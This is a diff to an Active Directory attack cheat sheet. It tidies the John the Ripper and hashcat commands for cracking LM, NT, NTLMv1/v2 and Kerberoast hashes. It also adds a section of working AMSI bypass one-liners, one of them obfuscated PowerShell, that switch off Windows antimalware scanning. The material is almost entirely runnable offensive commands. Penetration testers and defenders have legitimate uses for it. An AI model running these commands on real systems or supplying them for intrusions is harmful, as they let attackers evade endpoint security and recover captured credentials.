@@ -45,44 +45,47 @@ This AD attacks CheatSheet, made by RistBS is inspired by the [Active-Directory-
 ## Hash Cracking :
 
 LM :
+```bash
+# using JTR :
 john --format=lm hash.txt
+# using hashcat :
 hashcat -m 3000 -a 3 hash.txt
+```
 
-NT : 
+NT :
+
+```bash
+# using JTR :
 john --format=nt hash.txt --wordlist=wordlist.txt
-hsahcat -m 1000 -a 3 hash.txt
+# using hashcat :
+hashcat -m 1000 -a 3 hash.txt
+```
 
 
 NTLMv1 :
 
-using JTR :
 ```bash
+# using JTR :
 john --format=netntlmv1 hash.txt
-```
-using hashcat :
-```bash
+# using hashcat :
 hashcat -m 5500 --force -a 0 hash.txt wordlist.txt
 ```
 
 NTLMv2 :
 
-using JTR :
 ```bash
+# using JTR :
 john --format=netntlmv2 hash.txt
-```
-using hashcat :
-```bash
+# using hashcat :
 hashcat -m 5600 --force -a 0 hash.txt wordlist.txt
 ```
 
 Kerberoasting :
 
-using JTR :
 ```bash
+# using JTR :
 john --format=krb5tgs spn.txt --wordlist=wordlist.txt 
-```
-using hashcat :
-```bash
+# using hashcat :
 hashcat -m 13100 -a 0 spn.txt wordlist.txt --force
 ```
 
@@ -92,6 +95,20 @@ hashcat -m 18200 -a 0 hash wordlist.txt --force
 ```
 
 note : some Hash Type in hashcat depend of the **etype**
+
+
+## Enhanced Security Bypass:
+
+### AntiMalware Scan Interface :
+
+```powershell
+sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+```
+patching AMSI from Powershell6 :
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('s_amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
+
 
 ## MS Exhchange :
 
